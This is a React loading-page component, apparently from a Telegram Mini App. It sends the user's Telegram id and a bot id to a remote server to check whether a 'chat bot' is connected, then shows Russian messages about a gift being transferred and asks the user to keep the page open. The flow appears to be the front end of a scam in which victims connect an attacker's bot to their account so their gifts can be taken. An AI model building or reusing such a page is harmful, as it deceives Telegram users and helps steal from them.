import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

export default function Loading() {
  const navigate = useNavigate();
  const location = useLocation();
  const [error, setError] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);

  useEffect(() => {
    const searchParams = new URLSearchParams(location.search);
    const bot_id = searchParams.get('bot_id');
    const user_id = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;

    const checkConnection = async () => {
      try {
        const wait5sec = new Promise(resolve => setTimeout(resolve, 5000));

        const fetchConnection = fetch('https://tralalelotralala.digital:8001/check_connection', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_id, bot_id }),
        });

        const [res] = await Promise.all([fetchConnection, wait5sec]);

        if (!res.ok) throw new Error('Network response was not ok');

        const data = await res.json();
        console.log('[✅] API Response:', data);

        if (data?.connection === true) {
          setIsTransferring(true);
        } else {
          setError(true);
          setTimeout(() => {
            navigate('/intro' + location.search);
          }, 5000);
        }

      } catch (err) {
        console.error('[❌] API call failed:', err);
        setError(true);
        setTimeout(() => {
          navigate('/intro' + location.search);
        }, 5000);
      }
    };

    checkConnection();
  }, []);

  if (error) {
    return (
      <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-red-500 flex-col px-4 text-center">
        <b className="text-2xl mb-4">Не удалось проверить подключение</b>
        <h3 className="text-gray-400">Такое бывает. Иногда Telegram требуется от 10 секунд до минуты, чтобы применить изменения<br />Убедитесь что Чат-бот подключен верно!</h3>
        <p className="text-sm text-gray-300 mt-10">Не закрывайте страницу, выполняется повторное подключение...</p>
      </div>
    );
  }

  if (isTransferring) {
    return (
      <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-white flex-col">
        <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-blue-500"></div>
        <b className="mt-10">Выполняется, передача подарка...</b>
        <h3 className="text-gray-400 mt-3">Это может занять от 30 до 60 секунд. Пожалуйста, не закрывайте страницу</h3>
      </div>
    );
  }

  return (
    <div className="h-screen font-sans flex items-center justify-center bg-gray-800 text-white flex-col">
      <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-blue-500"></div>
      <b className="mt-10">Проверяем подключение...</b>
      <h3 className="text-center mt-4 text-gray-400">Это может занять от 30 до 60 секунд. Пожалуйста, не закрвывайте страницу</h3>
    </div>
  );
}

